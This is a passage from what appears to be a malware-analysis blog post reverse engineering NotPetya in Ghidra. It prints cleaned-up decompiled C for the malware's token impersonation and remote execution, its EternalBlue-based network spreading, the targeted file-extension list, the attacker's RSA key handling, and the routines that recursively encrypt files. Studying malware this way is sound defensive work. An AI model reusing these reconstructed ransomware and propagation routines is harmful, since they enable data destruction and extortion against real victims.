            CloseHandle(pvStack_11a60);
        }
        if(pvStack_11a5c != (HANDLE)0x0){
            CloseHandle(pvStack_11a5c);
        }
        if(_Stack_11aa8.hThread != (HANDLE)0x0){
            CloseHandle(_Stack_11aa8.hThread);
        }
        if(_Stack_11aa8.hProcess != (HANDLE)0x0){
            CloseHandle(_Stack_11aa8.hProcess);
        }
        if(iStack_11ac4 == 0){
            if((uStack_11ab0 == 0) || ((uStack_11ab0 & 3) != 0)){
LAB_10009d17:
                uStack_11ac0 = PathFileExistsW(lpNewShareDir);
            }
            else {
                uStack_11ac0 = 1;
            }
        }
        else if((iStack_11ac4 != 1) || (uStack_11ac0 = (uint)(uStack_11ab0 == 0), uStack_11ac0 == 0)) goto LAB_10009d17;
    }   
    iStack_11ac4 = iStack_11ac4 + 1;
    if(1 < iStack_11ac4) goto code_r0x10009d44;
    goto LAB_10009b82;
code_r0x10009d44:
    if(uStack_11ac0 == 0){
LAB_10009d4a:
        DeleteFileW(lpNetSharePath);
    }   
LAB_10009d58:
    if(pvStack_11ab8 != (HANDLE)0x0){
        CloseHandle(pvStack_11ab8);
        pvStack_11ab8 = (HANDLE)0x0;
    }   
    if(pvStack_11ab4 != (HANDLE)0x0){
        CloseHandle(pvStack_11ab4);
    }   
LAB_10009d7c:
    if(DStack_11aac == 0){
        WNetCancelConnection2W(lpMaybeSomeCredentialRelatedFunction?,0,1);
    }   
LAB_10009d9f:
    if(param_4 != (DWORD *)0x0){
        *param_4 = DStack_11aac;
    }
    SetLastError(DStack_11abc);
    return uStack_11ac0;
}
```

##### Back to lpStartAddress_10009f8e
Now, let's see what ghidra's decompilation looks like on `lpStartAddress_10009f8e`. We can instantly understand what it does now:

```c
int stealCredentialsAndExecuteMalwareOnOtherSystems(){
    bool bVar1;
    HANDLE hThread;
    LPCRITICAL_SECTION lpAcquiredCriticalSection;
    LPVOID lpMem;
    uint uVar2;
    undefined3 extraout_var;
    undefined4 unaff_EDI;
    cls_0x10006f91 lpSmt [16];
    undefined4 ptrGlobalLpCriticalSection;
    HANDLE hNewToken;
    HANDLE hCurrentToken;
    DWORD dwAccess;
    HANDLE *hToken;
    BOOL success;
    
    hToken = &hCurrentToken;
    success = 1;
    dwAccess = 0xb;
    hCurrentToken = (HANDLE)0x0;
    hNewToken = (HANDLE)0x0;
    hThread = GetCurrentThread();
    success = OpenThreadToken(hThread,dwAccess,success,hToken);

    if(success != 0){
        DuplicateTokenEx(hCurrentToken,MAXIMUM_ALLOWED,(LPSECURITY_ATTRIBUTES)0x0,SecurityImpersonation,TokenImpersonation,&hNewToken);
    }

    ptrGlobalLpCriticalSection = globalLpCriticalSection1;
    lpAcquiredCriticalSection = acquireCriticalSection(0x24,0x10006eda,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xffff);
    enumerateNetResources(lpAcquiredCriticalSection,(LPNETRESOURCEW)0x0);
    enumerateUserCredential(lpAcquiredCriticalSection);
    lockSemaphore();
    lpMem = allocateMemoryAndWait((short *)lpSmt);

    if(lpMem != (LPVOID)0x0){
        do {
            uVar2 = runMalwareOnRemoteHosts((int)lpSmt,(LPCWSTR)0x0,(LPCWSTR)0x0,(DWORD *)0x0);
            if (uVar2 != 0) {
                cls_0x10006f91::waitForSmt(lpSmt,(char)lpAcquiredCriticalSection,lpMem,unaff_EDI);
                cls_0x10006f91::waitForSmt(lpSmt,(char)ptrGlobalLpCriticalSection,0,unaff_EDI);
            }
            lpSmt[0].mbr_0x0 = 0;
            bVar1 = waitForSmtToo((short *)lpSmt);
        } while(CONCAT31(extraout_var,bVar1) != 0);
        heapFree(lpMem);
    }

    if(hCurrentToken != (HANDLE)0x0){
        CloseHandle(hCurrentToken);
        hCurrentToken = (HANDLE)0x0;
    }

    if(hNewToken != (HANDLE)0x0){
        CloseHandle(hNewToken);
    }

    return 0;
}
```

##### lpStartAddress_10007d58
Back to `Ordinal_1`, we can see the last thread call for the big if executes only if the `SeTcbPrivilege` was acquired: `lpStartAddress_10007d58`.
Inside there is a call to `FUN_10008bc6`.

##### FUN_10008bc6
Inside this function there are the same token calls we saw earlier. But now we also see some Sid related functions like `GetSidSubAuthorityCount` and `GetSidSubAuthority`. This function simply gets a pointer to a subauthority, yet the purpose is unknown, due to the fact the function ends like that.

##### Back to lpStartAddress_10007d58
There is not much to say about ths thread routine, we can just rename it to `doSmtWithSidSubAuthority`.

##### lpStartAddress_1000a0fe
Back to `Ordinal_1`, we are now back to the main program flow. After locking the semaphore, a thread is created with starting address `lpStartAddress_1000a0f`.

We can see that the `stealCredentialsAndExecuteMalwareOnOtherSystems` is executed only if SeTcbPrivilege wasn't already acquired. Then after some memory allocation things, another thread is created inside an infinite loop, with `lpStartAddress_1000a073` starting address function.

##### lpStartAddress_1000a073
Inside this thread function, we see some class definition, the method `waitForSmt` being executed along with tho other functions, being `FUN_10009e05` and `FUN_10009ec`.

##### FUN_10009e05
Inside `FUN_10009e05` we see a call to `runMalwareOnRemoteHosts` and `FUN_1000711f`, in which there are only Heap related functions and `smtWait`. We'll rename this function `allocWaitFree`.

There is nothing really special about this function, as it only executes the malware on the remote hosts. Cleaning up the code should give us something like that:

```c
uint runMalwareOnHosts(int lpNetShareUser){
    LPCWSTR *ppWVar1;
    LPVOID lpMem;
    int i, ret = 0, *local_c[2];
    
    // Allocate a buffer
    lpMem = allocWaitFree(3,local_c);
    if(lpMem != NULL){
        do {
            ppWVar1 = (LPCWSTR *)*local_c[0];
            local_c[0] = NULL;

            // Run the malware on the network infected devices
            ret = runMalwareOnRemoteHosts(lpNetShareUser,*ppWVar1,ppWVar1[1],local_c);

            // Exit conditions
            if((((local_c[0] == (int *)0x4b3) || (local_c[0] == (int *)0x4c6)) || (local_c[0] == (int *)0x35)) || (((local_c[0] == (int *)0x40 || (local_c[0] == (int *)0x43)) || (ret != 0)))) break;

            local_c[0] = NULL;
            i = smtWait(local_c);

        } while(i != 0);

        HeapFree(GetProcessHeap(),0,lpMem);
    }

    return ret;
}
```

##### FUN_10009ec7
Inside `FUN_10009ec7` the main thing we see is another thread creation inside another loop, this time with `lpStartAddress_10009ea4`, which again, runs the malware on the remote infected hosts. Not even joking, the ghidra's decompilation of this thread routing looks like this:

```c
int runAgainOnInfectedSystems(uint *ptrRet){
    uint retValue;
  
    retValue = runMalwareOnRemoteHosts(ptrRet[1],(LPCWSTR)ptrRet[2],(LPCWSTR)ptrRet[3],(DWORD *)0x0);
    *param_1 = retValue;
    return 0;
}
```

However, this thread starts suspended, then a thread token is set before resuming its execution. The general idea of what is going on there it this:

```c
int executeMalwareOnOtherSystemWithAdjustedToken(undefined4 param_1,undefined4 param_2){
    // Side note, param1 and param2 are not usefull in this decompilation

    HANDLE Token, hThread, *hHeap;
    DWORD susp;
    int success, ret = 0, outSuccess;
    
    Token = NULL

    // Allocate something for the new Token
    hHeap = allocWaitFree(0,&Token);
    if(hHeap != NULL){
        do {

            /* The Token is retrieved from allocWaitFree, it's just reassigning the variable */

            // Create a suspended thread
            hThread = CreateThread(NULL,0,runAgainOnInfectedSystems,&outSuccess,CREATE_SUSPENDED,NULL);
            if(hThread != NULL){

                // Set the new thread token, then resume the thread and wait for it to finish
                success = SetThreadToken(&hThread,Token);
                if(success){
                    susp = ResumeThread(hThread);
                    if(susp == -1) GetLastError();
                    else WaitForSingleObject(hThread,INFINITE); 
                }

                CloseHandle(hThread);
            }

            ret = outSuccess;

        } while((outSuccess == 0) && (smtWait(&Token) != 0));

        heapFree(hHeap);
    }

    return ret;
}
```

##### Back to lpStartAddress_1000a073
Now we can understand the logic of `lpStartAddress_1000a07`. All it does is simply try every method to run the malware on the infected net hosts.
As always, here is the cleaned up code:

```c
int runMalwareOnRemoteHostsAllPossibleWays(int *lpBuffer){
    int success, lpNullCriticalSection, ptrLpBuffer;
    LPVOID lpSmt;
    LPCRITICAL_SECTION lpCriticalSection;

    cls_0x10006f91 *this;
    
    // Get the critical sections
    lpCriticalSection = globalLpCriticalSection1;
    lpNullCriticalSection = globalLpNullCriticalSection;

    // If the buffer exists
    if(lpBuffer != NULL){
        ptrLpBuffer = *lpBuffer;
        this = (cls_0x10006f91 *)lpBuffer[1];

        // Try every possible way to run the malware on the remote hosts
        if((((globalLpCriticalSection2 != 0) && (success = runMalwareOnHosts((int)this), success != 0)) || ((lpNullCriticalSection != 0 && (lpNullCriticalSection = executeMalwareOnOtherSystemWithAdjustedToken(this,lpNullCriticalSection), lpNullCriticalSection != 0)))) || ((ptrLpBuffer != 0 && (success = runMalwareOnRemoteHosts(this,NULL,NULL,NULL), success != 0)))){
            cls_0x10006f91::waitForSmt(this,lpCriticalSection,0,lpSmt);
        }

        HeapFree(GetProcessHeap(),0,this);
        HeapFree(GetProcessHeap(),0,lpBuffer);

        return 0;
    }

    return 0;
}
```

##### Back to lpStartAddress_1000a0fe
How we have the general idea of what this thread routine does, it simply steals credentials, and try to run the malware on the other hosts as much ways as possible.
I'm not including the decompilation of this function here, as there is nothing interesting in there. We'll just rename it `stealCredentialsAndRunMalwareOnRemoteHostsAllPossibleWay`.

##### FUN_10008282
Next up in our decompilation we have `FUN_10008282`.
Inside here there is nothing crazy going on. It simply calls `calculateMalwareUptime`, followed by `NetServerGetInfo` and `NetApiBufferFree`.

In particular, it checks if the server info is set to be a `SV_TYPE_DOMAIN_CTRL` or `SV_TYPE_DOMAIN_BAKCTRL`. Then, a lot of logic is going on from the uptime calculation. This is what the decompiled function looks like:

```c
void calculateSmtUptimeMask(uint *lpUptimeMaskSmt,uint *lpUptimeMask_,uint *lpUptimeMaskDividedBy3_,uint *lpUptimeMaskSmtLogic_){
    uint lpUptimeMask;
    DWORD success;
    uint lpUptimeMaskDividedBy3;
    uint lpUptimeMaskSmtLogic;
    bool uptimeMajor85smt;
    SERVER_INFO_101 *lpServer101Info;
    bool controller;
    uint uptimeMinus85smt;
    
    lpUptimeMask = calculateMalwareUptime();
    uptimeMajor85smt = 85 < lpUptimeMask;
    controller = false;
    uptimeMinus85smt = lpUptimeMask - 85;
    lpServer101Info = (SERVER_INFO_101 *)0x0;

    success = NetServerGetInfo((LPWSTR)0x0,101,(LPBYTE *)&lpServer101Info);

    // Checks if the Server info is set to SV_TYPE_DOMAIN_CTRL or SV_TYPE_DOMAIN_BAKCTRL
    if((success == NERR_Success) && ((*(byte *)&lpServer101Info->sv101_type & 0x18) != 0)){
        controller = true;
    }

    if(lpServer101Info != (SERVER_INFO_101 *)0x0){
        NetApiBufferFree(lpServer101Info);
    }

    if(controller){
        lpUptimeMask = lpUptimeMask + 0xf;
    }

    lpUptimeMaskDividedBy3 = lpUptimeMask / 3;
    if(lpUptimeMask < 0x56){
        lpUptimeMaskSmtLogic = -(uint)(0xf < lpUptimeMask) & lpUptimeMask - 0xf;
    }

    else {
        lpUptimeMaskSmtLogic = 0x46;
    }

    if(0xf < lpUptimeMask){
        lpUptimeMask = 0xf;
    }

    if(lpUptimeMaskSmt != (uint *)0x0){
        *lpUptimeMaskSmt = -(uint)uptimeMajor85smt & uptimeMinus85smt;
    }

    if(lpUptimeMaskDividedBy3_ != (uint *)0x0){
        *lpUptimeMaskDividedBy3_ = lpUptimeMaskDividedBy3;
    }

    if(lpUptimeMaskSmtLogic_ != (uint *)0x0){
        *lpUptimeMaskSmtLogic_ = lpUptimeMaskSmtLogic;
    }

    if(lpUptimeMask_ != (uint *)0x0){
        *lpUptimeMask_ = lpUptimeMask;
    }

    return;
}
```

##### Back to Ordinal_1
Going back to `Ordinal_1`, we see something quite odd, all the parameter passed inside `calculateSmtUptimeMask` are all the NotPetya's `Ordinal_1` function parameters. This is strange, but we'll keep in mind that those values will get overridden by the function, as it fills them with some uptime junk.

##### lpStartAddress_1000a274
Anyways, the last thread call for `Ordinal_1` is executed, which is `lpStartAddress_1000a274`.
Inside it we see only a call to handfull of functions and a method. Let's go inside `FUN_10009dc3`.

##### FUN_10009dc3
This function is really small, it prepares some kind of string, to then get passed inside `FUN_100096c7`.

##### FUN_100096c7
Something is going on here. We see that the main function body is executed only if Norton Or Symantec products are present on the system.
The malware retrieves the dll path, then it passes an IP address into `FUN_10009683`.

This function retrieves the IPv4 address from the Computer name. In input the computer name is passes, and as output the IPv4 address in returned. It looks like this:

```c
bool getIPv4FromComputer(LPSTR lpFullyFormattedIPv4){
    hostent *hostEnt;
    byte *bytes;
  
    hostEnt = gethostbyname(lpFullyFormattedIPv4);

    if(hostEnt != NULL){
        bytes = *hostEnt->h_addr_list;
        wsprintfA(lpFullyFormattedIPv4,"%u.%u.%u.%u",*bytes,bytes[1],bytes[2],bytes[3]);
    }

    return hostEnt != NULL;
}
```

##### FUN_1000668a
Unfortunately looking inside `FUN_1000668a` and its subfunctions, there is some quite hard to understand logic. However from the passed parameters we can pretty much assume that it's doing something with the malware buffer in memory, and the IPv4 address. After a quick look inside we see some socket related functions, so I'm this function might try to spread the malware.

We'll just rename this function `tryToSpreadMalware`.

##### Back to FUN_100096c7
We could guess that this function is used to spread the malware on the other system on the network. It should be noted that those all of this logic is executed only if Norton or Symantec products are not present on the system. Anyways, there are tons of network related functions in there, so we could be right about the network spreading theory. We'll just rename it `spreadMalwareOnNet`.

Here is the ghidra's decompilation if you'd like to see it:

```c
int spreadMalwareOnNet(LPCWSTR lpWideAddr,undefined4 param_2,undefined4 param_3){
    WCHAR WVar1;
    bool bVar2;
    LPWSTR lpDllPath;
    int formattedAddr;
    undefined3 extraout_var;
    WCHAR *pWVar3;
    WCHAR local_314;
    undefined local_312 [518];
    CHAR lpAddress [260];
    int ret;
    undefined4 lpMalwareBuffer;
    undefined4 lpMalwareFileSize;
    
    lpMalwareFileSize = globalFileSize;
    lpMalwareBuffer = globalMalwareBuffer;
    ret = 0;

    // Execute it only if Norton or Symantec products are not present on the system
    if((((byte)globalAVFlags & 4) != 0) && (lpDllPath = PathFindFileNameW(&lpFullDllPath), lpDllPath != (LPWSTR)0x0)){
        formattedAddr = -2 - (int)lpDllPath;

        do {
            WVar1 = *lpDllPath;
            *(WCHAR *)(local_312 + formattedAddr + (int)lpDllPath) = WVar1;
            lpDllPath = lpDllPath + 1;
        } while(WVar1 != L'\0');

        WideCharToMultiByte(0xfde9,0,lpWideAddr,-1,lpAddress,0x104,(LPCSTR)0x0,(LPBOOL)0x0);
        formattedAddr = inet_addr(lpAddress);

        // Retrieve the IPv4 address of the computer
        if((formattedAddr == -1) && (bVar2 = getIPv4FromComputer(lpAddress), CONCAT31(extraout_var,bVar2) == 0)){
            return ret;
        }

        pWVar3 = &local_314;

        do {
            WVar1 = *pWVar3;
            pWVar3 = pWVar3 + 1;
        } while(WVar1 != L'\0');

        // Some logic going on here
        formattedAddr = tryToSpreadMalware(lpAddress,lpMalwareBuffer,lpMalwareFileSize,param_2,param_3,&local_314,(int)pWVar3 - (int)local_312 >> 1);

        if(formattedAddr == 0){
            ret = 1;
        }
    }

    return ret;
}
```

##### Back to FUN_10009dc3
Before going back to the `Ordinal_1` payload, I remebered something. The malware checked if ports 445 and 139 were open in previous reverse engineered functions, do you remember? I'm talking about the `bindPort445andPort139`.

Then I checked back some functions to check if I could find the `socket` function, to determine if the malware send those data through port 445.
And yes, I found what I was searching inside `FUN_10006727` and after some parameter guessing, take a look at the function:

```c
int socketThings(int *param_1,LPSTR lpAddr,ushort lpPort){
    byte bVar1;
    int iVar2;
    undefined2 uVar3;
    int sock;
    byte *unaff_EBX;
    undefined2 in_stack_0000000e;
    sockaddr *sockAddr;
    undefined4 lpNetAddr;
    undefined4 uStack_14;
    undefined4 uStack_10;
    u_long *argp;
    
    sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    argp = 1;

    // Regulate socket's IO
    ioctlsocket(sock,0x8004667e,&argp);

    if((sock == -1) || (bVar1 = *unaff_EBX, 0x1f < bVar1)) sock = -1;

    else {
        iVar2 = *param_1;
        *unaff_EBX = bVar1 + 1;
        *(int *)(iVar2 + (uint)bVar1 * 4) = sock;
        lpNetAddr = 0;
        uStack_14 = 0;
        uStack_10 = 0;
        sockAddr = (sockaddr *)0x2;

        // Port
        uVar3 = htons(lpPort);
        sockAddr = (sockaddr *)CONCAT22(uVar3,sockAddr._0_2_);

        // Net addr
        lpNetAddr = inet_addr(lpAddr);
        connect(sock,&sockAddr,16);
        sock = 0;
    }

    return sock;
}
```

Seeing which parameter indicates the port and the address, i followed in outside the `socketThings` function and `FUN_10005a7e`, only to reveal that the port is indeed 445. There is a famous exploit that uses this port: [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue).

Now we can now change `tryToSpreadMalware` to `eternalBlueExploit`, and then `spreadMalwareOnNet` to `spreadMalwareUsingEternalBlue`.
We can also change `FUN_10009dc3` to `eternalBlue`.

##### Back to lpStartAddress_1000a274
Now we can also understand what this thread routine does. It simply performs the EternalBlue exploit, and waits. As usual, here is the cleaned up function:

```c
int performEternalBlueAndWait(DWORD *lpBuff){
    LPVOID lpMem;
    char lpAddr[16];
    
    // Sleep and allocate memory
    Sleep(*lpBuff);
    lpMem = allocateMemoryAndWait(lpAddr);

    if(lpMem != NULL){
        
        /* LOOP BEGIN (I don't actually understand how many times it does run) */

            if(eternalBlue(lpAddr)){
                
                /* If the exploit goes well, wait (presumably for the other thread to start the malware execution process) */

            }

            waitForSmtToo(*lpAddr);
        
        /* LOOP END */

        heapFree(lpMem);
    }

    HeapFree(GetProcessHeap(),0,lpBuff);

    return 0;
}
```

#### doRansom
##### FUN_10001eef
Next up inside `Ordinal_1` is a function called `FUN_10001eef`. Inside it, there are calls to `GetLogicalDrives` and `GetDriveTypeW`, which are both responsible for enumerating the drives on the system. Then we see a string containing the public RSA key of the malware's author: `"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjKcIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB"`.

This string is stored into a larger ransom buffer, which also contains the drive path, After that, a thread is created, `lpStartAddress_10001e51` is the thread routine, and as parameter the ransom buffer is passed.

##### lpStartAddress_10001e51
Inside the thread routine, we see that calls to crypto functions such as `CryptAcquireContextW`, `CryptAcquireContextW`, `CryptDestroyKey` and `CryptReleaseContext` are made, effectively generating a cryptographic key. This function is effectively acquiring a handle to a crypto provider, a well as handling the context and key releasing. If the context is successfully acquired, a call to `FUN_10001b4e` is made.

##### FUN_10001b4e
This function is quite simple, it generates the crypto key, and sets the padding mode alongside the chipher mode. Ghidra doesn't decompile it cleanly, but we get the general idea. The key is store in the buffer we saw earlier. Here is the decompiled code:

```c
BOOL acquireCryptoKey(void){
    HCRYPTKEY *hProv;
    BOOL ret;
    BYTE *lpPaddingMode;
    BYTE *lpChipherMode;
    HCRYPTKEY *hKey;
    
    hKey = hProv + 5;
    ret = CryptGenKey(hProv[2],0x660e,1,hKey);

    if(ret != 0){
        lpChipherMode = (byte *)0x1;
        CryptSetKeyParam(*hKey,KP_MODE,(BYTE *)&lpChipherMode,0);
        lpPaddingMode = (byte *)PKCS5_PADDING;
        CryptSetKeyParam(*hKey,KP_PADDING,(BYTE *)&lpPaddingMode,0);
    }

    return ret;
}
```

###### FUN_10001973
When we go inside `FUN_10001973` we can immediately see some files related functions, and that this function is recursive. It gets a handle to the first file on the path, and loops through all of them. Then we see a string being used to see the file extension. It turns out that NotPetya encrypts only files with one of these extension: `.3ds .7z .accdb .ai .asp .aspx .avhd .back .bak .c .cfg .conf .cpp .cs .ctl .dbf .disk .djvu .doc .docx .dwg .eml .fdb .gz .h .hdd .kdbx .mail .mdb .msg .nrg .ora .ost .ova .ovf .pdf .php .pmf .ppt .pptx .pst .pvi .py .pyc .rar .rtf .sln .sql .tar .vbox .vbs .vcb .vdi .vfd .vmc .vmdk .vmsd .vmx .vsdx .vsv .work .xls .xlsx .xvd .zip`.

The malware also verifies that the files are not in the `C:\Windows\` path.
It's kind of a mess to clean this function properly, but let's first check out `FUN_1000189a`.

##### FUN_1000189a
Inside `FUN_1000189a` there is some logic going on, which is fairly easy to understand, it does nothing more that encrypting a file.
Here is a cleaned up view of the function:

```c
void encryptFile(LPCWSTR lpFile,int hKey){
    HANDLE hFile, hFileMapping;
    BYTE *pbData;
    BOOL success, bFinal;

    DWORD dwMaximumSizeLow;
    LARGE_INTEGER dwFileSize;
    
    hFile = CreateFileW(lpFile,(GENERIC_READ | GENERIC_WRITE),0,NULL,OPEN_EXISTING,0,NULL);

    if(hFile != NULL){
        GetFileSizeEx(hFile,&dwFileSize);
        bFinal = 0;

        if((dwFileSize.s.HighPart < 0) || ((dwFileSize.s.HighPart < 1 && (dwFileSize.s.LowPart < 0x100001)))){
            // Note that now lpFile contains the LowPart of dwFileSize
            lpFile = dwFileSize.s.LowPart;
            bFinal = 1;
            dwMaximumSizeLow = ((dwFileSize.s.LowPart >> 4) + 1) * 0x10;
        }

        else {
            lpFile = 0x100000;
            dwMaximumSizeLow = 0x100000;
        }

        hFileMapping = CreateFileMappingW(hFile,NULL,4,0,dwMaximumSizeLow,NULL);

        if(hFileMapping != NULL){
            pbData = MapViewOfFile(hFileMapping,6,0,0,lpFile);
            if(pbData != NULL){
                success = CryptEncrypt(hKey,0,bFinal,0,pbData,&lpFile,dwMaximumSizeLow);
                if(success) FlushViewOfFile(pbData,lpFile);

                UnmapViewOfFile(pbData);
            }

            CloseHandle(hFileMapping);
        }

        CloseHandle(hFile);
    }

    return;
}
```

###### Back to 
Now that we're back, we get the general idea of what this function actually does, it simply loops through all the files, except on the windows folder, and encrypts all the files with speific a extension. Here is the decompilation:

```c
void loopThroughFilesAndEncrypt(LPCWSTR lpPath,int recursionStop,int hKey){
    WCHAR WVar1;
    LPWSTR lpFirstExtFound;
    HANDLE hFindFile;
    DWORD DVar2;
    int iVar3;
    WCHAR *pWVar4;
    BOOL nextFile;
    WCHAR *charSmt;
    bool bVar5;
    WIN32_FIND_DATAW *lpWin32FindData;
    WCHAR aWStack_844 [274];
    WCHAR currentPath [260];
    WCHAR lpPathCombined [260];
    WCHAR fileExt [262];
    
    if(((recursionStop != 0) && (lpFirstExtFound = PathCombineW(lpPathCombined,lpPath,(LPCWSTR)"*"), lpFirstExtFound != (LPWSTR)0x0)) && (hFindFile = FindFirstFileW(lpPathCombined,(LPWIN32_FIND_DATAW)&lpWin32FindData), hFindFile != (HANDLE)0xffffffff)){
        do {
            if((*(HANDLE *)(hKey + 0x1c) != (HANDLE)0x0) && ((DVar2 = WaitForSingleObject(*(HANDLE *)(hKey + 0x1c),0), DVar2 == 0 || (DVar2 == 0xffffffff)))) break;
            charSmt = L".";
            pWVar4 = aWStack_844;
            do {
                WVar1 = *pWVar4;
                bVar5 = (ushort)WVar1 < (ushort)*charSmt;
                if(WVar1 != *charSmt){
LAB_10001a22:
                    iVar3 = (1 - (uint)bVar5) - (uint)(bVar5 != 0);
                    goto LAB_10001a27;
                }

                if(WVar1 == L'\0') break;

                WVar1 = pWVar4[1];
                bVar5 = (ushort)WVar1 < (ushort)charSmt[1];

                if(WVar1 != charSmt[1]) goto LAB_10001a22;

                pWVar4 = pWVar4 + 2;
                charSmt = charSmt + 2;
            } while(WVar1 != L'\0');

            iVar3 = 0;
LAB_10001a27:
            if(iVar3 != 0){
                charSmt = L"..";
                pWVar4 = aWStack_844;

                do {
                    WVar1 = *pWVar4;
                    bVar5 = (ushort)WVar1 < (ushort)*charSmt;
                    if(WVar1 != *charSmt){
LAB_10001a5e:
                        iVar3 = (1 - (uint)bVar5) - (uint)(bVar5 != 0);
                        goto LAB_10001a63;
                    }

                    if(WVar1 == L'\0') break;
                    WVar1 = pWVar4[1];
                    bVar5 = (ushort)WVar1 < (ushort)charSmt[1];

                    if(WVar1 != charSmt[1]) goto LAB_10001a5e;
                    pWVar4 = pWVar4 + 2;
                    charSmt = charSmt + 2;

                } while (WVar1 != L'\0');
                iVar3 = 0;
LAB_10001a63:
                if((iVar3 != 0) && (lpFirstExtFound = PathCombineW(currentPath,lpPath,aWStack_844), lpFirstExtFound != (LPWSTR)0x0)){
                    if((((uint)lpWin32FindData & 0x10) == 0) || (((uint)lpWin32FindData & 0x400) != 0)){
                        lpFirstExtFound = PathFindExtensionW(aWStack_844);
                        pWVar4 = aWStack_844;

                        do {
                            WVar1 = *pWVar4;
                            pWVar4 = pWVar4 + 1;
                        } while(WVar1 != L'\0');

                        if(lpFirstExtFound != aWStack_844 + ((int)pWVar4 - (int)(aWStack_844 + 1) >> 1)){
                            wsprintfW(fileExt,L"%ws.",lpFirstExtFound);

                            // Extensions to encrypt
                            lpFirstExtFound = StrStrIW(L".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk .djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php .pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vm sd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip.",fileExt);
                           
                            if(lpFirstExtFound != (LPWSTR)0x0){
                                encryptFile(currentPath,hKey);
                            }
                        }
                    }
                    else {
                        // Path to avoid

                        lpFirstExtFound = StrStrIW(L"C:\\Windows;",currentPath);

                        if(lpFirstExtFound == (LPWSTR)0x0){
                            loopThroughFilesAndEncrypt(currentPath,recursionStop + -1,hKey);
                        }
                    }
                }
            }
            nextFile = FindNextFileW(hFindFile,(LPWIN32_FIND_DATAW)&lpWin32FindData);
        } while (nextFile != 0);

        FindClose(hFindFile);
    }

    return;
}
```

###### FUN_10001d32
The last custom function called by thread routine, `FUN_10001d32`, contains another custom functions, and some file related functions, such as `CreateFileW` and `WriteFile`. We can however see some ransom note text in here. We can already imagine what this function does, but we're going to have a look to `FUN_10001ba0` anyways.

###### FUN_10001ba0
This function is pretty easy to understand too. All it's doing is encoding in base64 a string, decodes this string is a RSA public key blob, which is then imported and saved inside the `lpKeyBuff`. Note that the `lpKeyBuff` contains the handle to the crypto provider, the keys, and more. It's not a single variable. Anyways, cleaning up a bit the decompilation results in something like this:

```c
BOOL getHandleToPubKeyBlob(LPVOID lpKeyBuff){
    BOOL success, imported = 0;
    BYTE *lpBase64key, *pbData;
    SIZE_T lpNewSize, lpBytesNeeded = 0;
    
    // Pre calculating the key length to store in the buffer (notice the offset)
    success = CryptStringToBinaryW(lpKeyBuff + 0x10,0,CRYPT_STRING_BASE64,NULL,&lpBytesNeeded,NULL,NULL);

    // Allocate the necessary space
    if(success && (lpBase64key = LocalAlloc(GPTR,lpBytesNeeded), lpBase64key != NULL)){
        
        // Convert the key into base64
        success = CryptStringToBinaryW(L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2 n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GR KxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB",0,CRYPT_STRING_BASE64,lpBase64key,&lpBytesNeeded,NULL,NULL);
        if(success){
            lpNewSize = 0;

            // Gather the size on the new imported key
            success = CryptDecodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,RSA_CSP_PUBLICKEYBLOB,lpBase64key,lpBytesNeeded,0,NULL,NULL,&lpNewSize);
            if((success) && (pbData = LocalAlloc(GPTR,lpNewSize), pbData != NULL)){

                // Decode the base64 key as a RSA public blob key
                success = CryptDecodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,RSA_CSP_PUBLICKEYBLOB,lpBase64key,lpBytesNeeded,0,NULL,pbData,&lpNewSize);

                // Import the buffer as a new key (notice tge paraneters, again)
                if(success) imported = CryptImportKey(lpKeyBuff + 8 /* hProv */,pbData,lpNewSize,0,0,lpKeyBuff + 0xc /* hNewKey */);
                

                LocalFree(pbData);
            }
        }

        LocalFree(lpBase64key);
    }

    return imported;
}
```

##### FUN_10001c7f
Next up in the list we have `FUN_10001c7f`. We see again the same crypto related functions we saw earlier, except now the blob is not being imported, but exported. We also see a variable called `in_EAX` is present. This is the case because no parameters were passed inside the function, but the value in EAX register is used by the functions. Looking at the offsets of the variable, we can tell this is the `lpRansomBuff` variable.

Here is a cleaned up view of the function:

```c
LPWSTR exportKeyBlob(){
    BOOL success;
    BYTE *lpBlobData;
    LPVOID lpEncryptedBlob, lpEncryptedBlobLen, ptrEncryptedBlob, lpRansomBuff, ret = 0;
    SIZE_T lpBlobLen = 0;

    // Gather the key size
    success = CryptExportKey(lpRansomBuff + 0x14 /* This is the key used to encrypt the files */,lpRansomBuff + 0xc,SIMPLEBLOB,0,NULL,&lpBlobLen);

    if((success != 0) && (lpBlobData = (BYTE *)LocalAlloc(GPTR,lpBlobLen), lpBlobData != NULL)){

        // Export the key into the blob
